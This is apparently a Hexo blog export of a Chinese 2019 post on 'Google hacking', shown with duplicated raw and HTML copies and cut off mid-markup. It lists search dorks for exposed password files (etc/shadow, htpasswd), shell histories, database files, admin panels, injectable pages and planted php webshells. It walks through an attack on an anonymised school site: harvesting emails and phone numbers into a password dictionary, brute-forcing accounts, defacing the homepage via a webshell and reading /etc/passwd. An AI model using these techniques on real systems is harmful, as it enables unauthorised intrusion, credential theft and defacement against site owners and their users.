.bash_history\n\nintitle:”index of” passwd\n\nintitle:”index of” people.lst\n\nintitle:”index of” pwd.db\n\nintitle:”index of” etc/shadow\n\nintitle:”index of” spwd\n\nintitle:”index of” master.passwd\n\nintitle:”index of” htpasswd\n\n“# -FrontPage-” inurl:service.pwd\n```\n\n\n同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点:\n\n```\nintext:ZeroBoard filetype:php\n```\n\n或者使用:\n\n```\ninurl:　outlogin.php?_zb_path= site:.jp\n```\n\n\nphpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序\n\n```\nintitle:phpmyadmin intext:Create new database\n```\n\n可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等)\n\n```\nallinurl:bbs data\n\nfiletype:mdb inurl:database\n\nfiletype:inc conn\n\ninurl:data filetype:mdb\n\nintitle:”index of” data //在一些配置不正确的apache+win32的服务器上经常出现这种情况\n```\n\n\n### 实战演示\n\n利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试\n\n首先用google先看这个站点的一些基本情况\n\n```\nsite:xxxx.com\n```\n\n从返回的信息中，找到几个该校的几个系院的域名：\n\n```\nhttp://a1.xxxx.com\n\nhttp://a2.xxxx.com\n\nhttp://a3.xxxx.com\n\nhttp://a4.xxxx.com\n```\n\n顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料\n\n```\nsite:xxxx.com filetype:doc\n```\n\n\n得到N个不错的doc。先找找网站的管理后台地址：\n\n```\nsite:xxxx.com intext:管理\n\nsite:xxxx.com inurl:login\n\nsite:xxxx.com intitle:管理\n```\n\n超过获得2个管理后台地址：\n\n```\nhttp://a2.xxxx.com/sys/admin_login.asp\n\nhttp://a3.xxxx.com:88/_admin/login_in.asp\n```\n\n\n看看服务器上跑的是什么程序：\n\n```\nsite:a2.xxxx.com filetype:asp\n\nsite:a2.xxxx.com filetype:php\n\nsite:a2.xxxx.com filetype:aspx\n\nsite:a3.xxxx.com filetype:asp\n```\n\n\na2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛\n\na3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的：\n\n```\nsite:a2.xxxx.com intext:ftp://:\n```\n\n再看看有没有上传一类的漏洞：\n\n```\nsite:a2.xxxx.com inurl:file\n\nsite:a3.xxxx.com inurl:load\n```\n\n在a2上发现一个上传文件的页面：\n\n```\nhttp://a2.xxxx.com/sys/uploadfile.asp\n```\n\n用IE看了一下，没权限访问。试试注射\n\n```\nsite:a2.xxxx.com filetype:asp\n```\n\n一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形\n\n```\nsite:xxxx.com //得到N个二级域名\n\nsite:xxxx.com intext:@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的\n\nsite:xxxx.com intext:电话 //N个电话 \n```\n\n把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号\n\n\n\ngoogle hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维\n\n对于一些在win上跑 apache的应该多注意一下这方面，一个`intitle:index of`就差不多都出来了 `echo “召唤” > index.jsp` 现在看看首页，已经被改成: “召唤” 了。\n\n也可以用WGET上传一个文件上去，然后`execute Command输入 cat file > index.html or echo “”> file echo “test” >> file` 这样一条条打出来，站点首页就成功被替换了\n\n同样的也可以 `uname -a;cat /etc/passwd` 不过有点要注意，有些WEBSHELL程序有问题，执行不了的，\n\n#### 搜索INC敏感信息\n\n在google的搜索框中填入: `Code: .org filetype:inc` \n\n例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女) \n\n`operator:foo filetype:123` 类型 \n\n`site:foo.com` 相对直接看网站更有意思，可以得到许多意外的信息 \n\n`intext:foo intitle: fooltitle` 标题 `allinurl:foo` 搜索xx网站的所有相关连接。（踩点必备） \n\n`links:foo `不要说就知道是它的相关链接 \n\n`allintilte:foo.com` 可以辅助`”-” “+”`来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索)\n\n可以再延伸到上面的结果里进行二次搜索\n\n`“index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd`\n\n或者某个比如pcanywhere的密码后缀cif等\n\n再来点更敏感信息 `“robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf` (FrontPage的关键索引啦，扫描器的CGI库一般都有) \n\n`allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口)`\n\n或者desktop port等多个关键字检索 `webmin port 10000 inurl:/admin/login.asp intext:　Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php` 直接搜索到phpwebshell\n\n```\nfoo.org filetype:inc\n\nipsec filetype:conf\n\nintilte:”error occurred” ODBC request where (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射\n\n“Dumping data for table” username password\n\nintitle:”Error using Hypernews”\n\n“Server Software”\n\nintitle:”HTTP_USER_AGENT=Googlebot”\n\n“HTTP_USER_ANGET=Googlebot” THS ADMIN\n\nfiletype:.doc site:.mil classified 直接搜索军方相关word\n```\n检查多个关键字：\n```\nintitle:config confixx login password\n\n“mydomain.com” nessus report\n\n“report generated by”\n\n“ipconfig”\n\n“winipconfig”\n```\n\ngoogle缓存利用，搜索时候多”选搜索所有网站”\n\n特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典\n\n\n一些技巧集合：\n\n1) index.of.password\n\n1) filetype:blt “buddylist”\n\n2) “access denied for user” “using password”\n\n2) intitle:”index of” inurl:ftp (pub | incoming)\n\n3) “http://:@www” domainname\n\n3) filetype:cnf inurl:_vti_pvt access.cnf\n\n4) auth_user_file.txt\n\n4) allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/”\n\n5) The Master List\n\n5) inurl:”install/install.php”\n\n6) allinurl: admin mdb\n\n6) intitle:”welcome.to.squeezebox”\n\n7) passlist.txt (a better way)\n\n7) intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board”\n\n8) “A syntax error has occurred” filetype:ihtml\n\n8) intitle:　Login intext:”RT is ? Copyright”\n\n9) “# -FrontPage-” inurl:service.pwd\n\n9) ext:php program_listing intitle:MythWeb.Program.Listing\n\n10) ORA-00921: unexpected end of SQL command\n\n10) intitle:index.of abyss.conf","source":"_posts/2019/9/GoogleHacking.md","raw":"---\nlayout: post\ntitle: GoogleHacking\ntags:\n  - google\ncategories:\n  - hacker\nabbrlink: 47235\n---\n\n### 前言\n\nGoogle hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动\n\nGoogle hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台\n\n<!--more-->\n\n### 常用语法\n\n#### intext\n\n这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入`intext:动漫`，将返回所有在网页正文部分包含”动漫”的网页，`allintext:`使用方法和`intext`类似\n\n#### intitle\n\n和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:`intitle:安全天使`，将返回所有网页标题中包含”安全天使”的网页，同理`allintitle:`也同`intitle`类似\n\n#### cache\n\n搜索google里关于某些内容的缓存，也许能找到一些好东西\n\n#### define\n\n搜索某个词语的定义，搜索:`define:hacker`，将返回关于hacker的定义\n\n#### filetype\n\n搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:`filetype:doc`，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富\n\n\n#### info\n\n查找指定站点的一些基本信息\n\n#### inurl\n\n搜索:`inurl:www.123.net`可以返回所有和`www.123.net`做了链接的URL\n\n#### site\n\n搜索:`site:www.123.net`，将返回所有和123.net这个站有关的URL\n\n还有一些操作符也是很有用的:\n\n```\n– 把某个字忽略\n\n~ 同意词\n\n. 单一的通配符\n\n“” 精确查询\n```\n\n### 典型用法\n\n- 找管理后台地址\n\n```\nsite:xxx.com intext：管理后台登陆用户名密码系統账号\n\nsite:xxx.com inurl: login/admin/manage/manager/adminlogin/system \n\nsite:xxx.com intitle 管理后台登陆\n```\n\n- 找上传类漏洞地址：\n\n```\nsite:xxx.com inurl:file \n\nsite:xxx.com inurl:upload \n```\n\n- 找注入页面\n\n```\nsite:xxx.com inurl:php?id=\n```\n\n- 找编辑器页面\n\n```\nsite:xxx.com inurl:ewebeditor\n```\n\n### 实际应用\n\n对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容\n\n```\nintitle:”index of” etc\n\nintitle:”Index of” .sh_history\n\nintitle:”Index of” .bash_history\n\nintitle:”index of” passwd\n\nintitle:”index of” people.lst\n\nintitle:”index of” pwd.db\n\nintitle:”index of” etc/shadow\n\nintitle:”index of” spwd\n\nintitle:”index of” master.passwd\n\nintitle:”index of” htpasswd\n\n“# -FrontPage-” inurl:service.pwd\n```\n\n\n同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点:\n\n```\nintext:ZeroBoard filetype:php\n```\n\n或者使用:\n\n```\ninurl:　outlogin.php?_zb_path= site:.jp\n```\n\n\nphpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序\n\n```\nintitle:phpmyadmin intext:Create new database\n```\n\n可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等)\n\n```\nallinurl:bbs data\n\nfiletype:mdb inurl:database\n\nfiletype:inc conn\n\ninurl:data filetype:mdb\n\nintitle:”index of” data //在一些配置不正确的apache+win32的服务器上经常出现这种情况\n```\n\n\n### 实战演示\n\n利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试\n\n首先用google先看这个站点的一些基本情况\n\n```\nsite:xxxx.com\n```\n\n从返回的信息中，找到几个该校的几个系院的域名：\n\n```\nhttp://a1.xxxx.com\n\nhttp://a2.xxxx.com\n\nhttp://a3.xxxx.com\n\nhttp://a4.xxxx.com\n```\n\n顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料\n\n```\nsite:xxxx.com filetype:doc\n```\n\n\n得到N个不错的doc。先找找网站的管理后台地址：\n\n```\nsite:xxxx.com intext:管理\n\nsite:xxxx.com inurl:login\n\nsite:xxxx.com intitle:管理\n```\n\n超过获得2个管理后台地址：\n\n```\nhttp://a2.xxxx.com/sys/admin_login.asp\n\nhttp://a3.xxxx.com:88/_admin/login_in.asp\n```\n\n\n看看服务器上跑的是什么程序：\n\n```\nsite:a2.xxxx.com filetype:asp\n\nsite:a2.xxxx.com filetype:php\n\nsite:a2.xxxx.com filetype:aspx\n\nsite:a3.xxxx.com filetype:asp\n```\n\n\na2服务器用的应该是IIS，上面用的是asp的整站程序，还有一个php的论坛\n\na3服务器也是IIS，aspx+asp。web程序都应该是自己开发的。有论坛那就看看能不能遇见什么公共的FTP帐号什么的：\n\n```\nsite:a2.xxxx.com intext:ftp://:\n```\n\n再看看有没有上传一类的漏洞：\n\n```\nsite:a2.xxxx.com inurl:file\n\nsite:a3.xxxx.com inurl:load\n```\n\n在a2上发现一个上传文件的页面：\n\n```\nhttp://a2.xxxx.com/sys/uploadfile.asp\n```\n\n用IE看了一下，没权限访问。试试注射\n\n```\nsite:a2.xxxx.com filetype:asp\n```\n\n一般学校的站点的密码都比较有规律，通常都是域名+电话一类的变形\n\n```\nsite:xxxx.com //得到N个二级域名\n\nsite:xxxx.com intext:@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的\n\nsite:xxxx.com intext:电话 //N个电话 \n```\n\n把这些信息做个字典，挂上慢慢跑。过了一段时间就跑出4个帐号，2个是学生会的，1个管理员，还有一个可能是老师的帐号\n\n\n\ngoogle hack其实也都差不多是一些基本语法的灵活运用，或者配合某个脚本漏洞，主要还是靠个人的灵活思维\n\n对于一些在win上跑 apache的应该多注意一下这方面，一个`intitle:index of`就差不多都出来了 `echo “召唤” > index.jsp` 现在看看首页，已经被改成: “召唤” 了。\n\n也可以用WGET上传一个文件上去，然后`execute Command输入 cat file > index.html or echo “”> file echo “test” >> file` 这样一条条打出来，站点首页就成功被替换了\n\n同样的也可以 `uname -a;cat /etc/passwd` 不过有点要注意，有些WEBSHELL程序有问题，执行不了的，\n\n#### 搜索INC敏感信息\n\n在google的搜索框中填入: `Code: .org filetype:inc` \n\n例：常用的google关键字： foo1 foo2 (也就是关联，比如搜索xx公司 xx美女) \n\n`operator:foo filetype:123` 类型 \n\n`site:foo.com` 相对直接看网站更有意思，可以得到许多意外的信息 \n\n`intext:foo intitle: fooltitle` 标题 `allinurl:foo` 搜索xx网站的所有相关连接。（踩点必备） \n\n`links:foo `不要说就知道是它的相关链接 \n\n`allintilte:foo.com` 可以辅助`”-” “+”`来调整搜索的精确程度 直接搜索密码：(引号表示为精确搜索)\n\n可以再延伸到上面的结果里进行二次搜索\n\n`“index of” htpasswd / passwd filetype:xls username password email “ws_ftp.log” “config.php” allinurl:admin mdb service filetype:pwd`\n\n或者某个比如pcanywhere的密码后缀cif等\n\n再来点更敏感信息 `“robots.txt” “Disallow:” filetype:txt inurl:_vti_cnf` (FrontPage的关键索引啦，扫描器的CGI库一般都有) \n\n`allinurl: /msadc/Samples/selector/showcode.asp /../../../passwd /examples/jsp/snp/snoop.jsp phpsysinfo intitle:index of /admin intitle:”documetation” inurl: 5800(vnc的端口)`\n\n或者desktop port等多个关键字检索 `webmin port 10000 inurl:/admin/login.asp intext:　Powered by GBook365 intitle:”php shell” “Enable stderr” filetype:php` 直接搜索到phpwebshell\n\n```\nfoo.org filetype:inc\n\nipsec filetype:conf\n\nintilte:”error occurred” ODBC request where (select|insert) 说白了就是说，可以直接试着查查数据库检索，针对目前流行的sql注射\n\n“Dumping data for table” username password\n\nintitle:”Error using Hypernews”\n\n“Server Software”\n\nintitle:”HTTP_USER_AGENT=Googlebot”\n\n“HTTP_USER_ANGET=Googlebot” THS ADMIN\n\nfiletype:.doc site:.mil classified 直接搜索军方相关word\n```\n检查多个关键字：\n```\nintitle:config confixx login password\n\n“mydomain.com” nessus report\n\n“report generated by”\n\n“ipconfig”\n\n“winipconfig”\n```\n\ngoogle缓存利用，搜索时候多”选搜索所有网站”\n\n特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典\n\n\n一些技巧集合：\n\n1) index.of.password\n\n1) filetype:blt “buddylist”\n\n2) “access denied for user” “using password”\n\n2) intitle:”index of” inurl:ftp (pub | incoming)\n\n3) “http://:@www” domainname\n\n3) filetype:cnf inurl:_vti_pvt access.cnf\n\n4) auth_user_file.txt\n\n4) allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/”\n\n5) The Master List\n\n5) inurl:”install/install.php”\n\n6) allinurl: admin mdb\n\n6) intitle:”welcome.to.squeezebox”\n\n7) passlist.txt (a better way)\n\n7) intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board”\n\n8) “A syntax error has occurred” filetype:ihtml\n\n8) intitle:　Login intext:”RT is ? Copyright”\n\n9) “# -FrontPage-” inurl:service.pwd\n\n9) ext:php program_listing intitle:MythWeb.Program.Listing\n\n10) ORA-00921: unexpected end of SQL command\n\n10) intitle:index.of abyss.conf","slug":"2019/9/GoogleHacking","published":1,"date":"2019-09-06T11:48:00.905Z","updated":"2020-04-12T06:34:43.626Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzs001c44vqsbtidmam","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Google hacker (Google黑客)是利用GOOGLE提供的搜索功能查找黑客们想找到的信息，一般是查找网站后台，网管的个人信息，也可以用来查找某人在网络上的活动</p>\n<p>Google hacker 一般是做为黑客在入侵时的一个手段，在入侵过程中有时需要查找后台的登陆口就需要用到GOOGLE HACKER，有时猜解密码的时候google也是提供查找管理员资料的有效平台</p>\n<a id=\"more\"></a>\n<h3 id=\"常用语法\"><a href=\"#常用语法\" class=\"headerlink\" title=\"常用语法\"></a>常用语法</h3><h4 id=\"intext\"><a href=\"#intext\" class=\"headerlink\" title=\"intext\"></a>intext</h4><p>这个就是把网页中的正文内容中的某个字符做为搜索条件，例如在google里输入<code>intext:动漫</code>，将返回所有在网页正文部分包含”动漫”的网页，<code>allintext:</code>使用方法和<code>intext</code>类似</p>\n<h4 id=\"intitle\"><a href=\"#intitle\" class=\"headerlink\" title=\"intitle\"></a>intitle</h4><p>和intext差不多，搜索网页标题中是否有所要找的字符，例如搜索:<code>intitle:安全天使</code>，将返回所有网页标题中包含”安全天使”的网页，同理<code>allintitle:</code>也同<code>intitle</code>类似</p>\n<h4 id=\"cache\"><a href=\"#cache\" class=\"headerlink\" title=\"cache\"></a>cache</h4><p>搜索google里关于某些内容的缓存，也许能找到一些好东西</p>\n<h4 id=\"define\"><a href=\"#define\" class=\"headerlink\" title=\"define\"></a>define</h4><p>搜索某个词语的定义，搜索:<code>define:hacker</code>，将返回关于hacker的定义</p>\n<h4 id=\"filetype\"><a href=\"#filetype\" class=\"headerlink\" title=\"filetype\"></a>filetype</h4><p>搜索指定类型的文件，撒网式攻击还是对特定目标进行信息收集都需要用到这个，例如输入:<code>filetype:doc</code>，将返回所有以doc结尾的文件URL，如果找.bak、.mdb或.inc也是可以的，获得的信息也许会更丰富</p>\n<h4 id=\"info\"><a href=\"#info\" class=\"headerlink\" title=\"info\"></a>info</h4><p>查找指定站点的一些基本信息</p>\n<h4 id=\"inurl\"><a href=\"#inurl\" class=\"headerlink\" title=\"inurl\"></a>inurl</h4><p>搜索:<code>inurl:www.123.net</code>可以返回所有和<code>www.123.net</code>做了链接的URL</p>\n<h4 id=\"site\"><a href=\"#site\" class=\"headerlink\" title=\"site\"></a>site</h4><p>搜索:<code>site:www.123.net</code>，将返回所有和123.net这个站有关的URL</p>\n<p>还有一些操作符也是很有用的:</p>\n<figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">– 把某个字忽略</span><br><span class=\"line\"></span><br><span class=\"line\">~ 同意词</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">. </span>单一的通配符</span><br><span class=\"line\"></span><br><span class=\"line\">“” 精确查询</span><br></pre></td></tr></table></figure>\n<h3 id=\"典型用法\"><a href=\"#典型用法\" class=\"headerlink\" title=\"典型用法\"></a>典型用法</h3><ul>\n<li>找管理后台地址</li>\n</ul>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:xxx.com intext：管理后台登陆用户名密码系統账号</span><br><span class=\"line\"></span><br><span class=\"line\">site:xxx.com inurl: login/admin/manage/manager/adminlogin<span class=\"built_in\">/system </span></span><br><span class=\"line\"></span><br><span class=\"line\">site:xxx.com intitle 管理后台登陆</span><br></pre></td></tr></table></figure>\n<ul>\n<li>找上传类漏洞地址：</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxx.com</span> <span class=\"selector-tag\">inurl</span><span class=\"selector-pseudo\">:file</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxx.com</span> <span class=\"selector-tag\">inurl</span><span class=\"selector-pseudo\">:upload</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>找注入页面</li>\n</ul>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">site:</span>xxx.com <span class=\"string\">inurl:</span>php?id=</span><br></pre></td></tr></table></figure>\n<ul>\n<li>找编辑器页面</li>\n</ul>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxx.com</span> <span class=\"selector-tag\">inurl</span><span class=\"selector-pseudo\">:ewebeditor</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"实际应用\"><a href=\"#实际应用\" class=\"headerlink\" title=\"实际应用\"></a>实际应用</h3><p>对于攻击者来说，可能最感兴趣的就是密码文件了，而google正因为其强大的搜索能力往往会把一些敏感信息透露出来，用google搜索以下内容</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” etc</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">Index</span> <span class=\"keyword\">of</span>” .sh_history</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">Index</span> <span class=\"keyword\">of</span>” .bash_history</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” passwd</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” people.lst</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” pwd.db</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” etc/shadow</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” spwd</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” master.passwd</span><br><span class=\"line\"></span><br><span class=\"line\">intitle:”<span class=\"keyword\">index</span> <span class=\"keyword\">of</span>” htpasswd</span><br><span class=\"line\"></span><br><span class=\"line\">“# -FrontPage-” inurl:service.pwd</span><br></pre></td></tr></table></figure>\n<p>同样可以用google来搜索一些具有漏洞的程序，例如ZeroBoard前段时间发现个文件代码泄露漏洞，我们可以用google来找网上使用这套程序的站点:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">intext</span><span class=\"selector-pseudo\">:ZeroBoard</span> <span class=\"selector-tag\">filetype</span><span class=\"selector-pseudo\">:php</span></span><br></pre></td></tr></table></figure>\n<p>或者使用:</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">inurl:</span>　outlogin.php?_zb_path= site:.jp</span><br></pre></td></tr></table></figure>\n<p>phpmyadmin是一套功能强大的数据库操作软件，一些站点由于配置失误，导致可以不使用密码直接对phpmyadmin进行操作，可以用google搜索存在这样漏洞的程序</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">intitle:</span>phpmyadmin <span class=\"string\">intext:</span>Create <span class=\"keyword\">new</span> database</span><br></pre></td></tr></table></figure>\n<p>可以用google来搜索数据库文件，用上一些语法来精确查找能够获得更多东西(access的数据库,mssql、mysql的连接文件等等)</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">allinurl</span>:bbs data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">filetype</span>:mdb <span class=\"attribute\">inurl</span>:database</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">filetype</span>:inc conn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">inurl</span>:data <span class=\"attribute\">filetype</span>:mdb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">intitle</span>:”index of” data <span class=\"comment\">//在一些配置不正确的apache+win32的服务器上经常出现这种情况</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h3><p>利用google完全是可以对一个站点进行信息收集和渗透的，下面用google对特定站点进行一次测试</p>\n<p>首先用google先看这个站点的一些基本情况</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">site:</span>xxxx.com</span><br></pre></td></tr></table></figure>\n<p>从返回的信息中，找到几个该校的几个系院的域名：</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a1.xxxx.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a2.xxxx.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a3.xxxx.com</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"symbol\">http:</span><span class=\"comment\">//a4.xxxx.com</span></span><br></pre></td></tr></table></figure>\n<p>顺便ping了一下，应该是在不同的服务器，学校一般都会有不少好的资料</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">site</span><span class=\"selector-pseudo\">:xxxx.com</span> <span class=\"selector-tag\">filetype</span><span class=\"selector-pseudo\">:doc</span></span><br></pre></td></tr></table></figure>\n<p>得到N个不错的doc。先找找网站的管理后台地址：</p>\n<figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intext</span>:管理</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">inurl</span>:login</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attribute\">site</span>:xxxx.com <span class=\"attribute\">intitle</span>:管理</span><br></pre></td></tr></table></figure>\n<p>超过获得2个管理后台地址：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span>a2.xxxx.com<span class=\"regexp\">/sys/</span>admin_login.asp</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"regexp\">//</span>a3.xxxx.com:<span class=\"number\">88</span><span class=\"regexp\">/_admin/</span>login_in.asp</span><br></pre></td></tr></table></figure>\n<p>看看服务器上跑的是什么程序：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:asp</span><br><span class=\"line\"></span><br><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> filetype:php</span><br><span class=\"line\"></span><br><span class=\"line\">site:a2<span class=\"selector-class\">.xxxx</span><span class=\"selector-class\">.com</span> 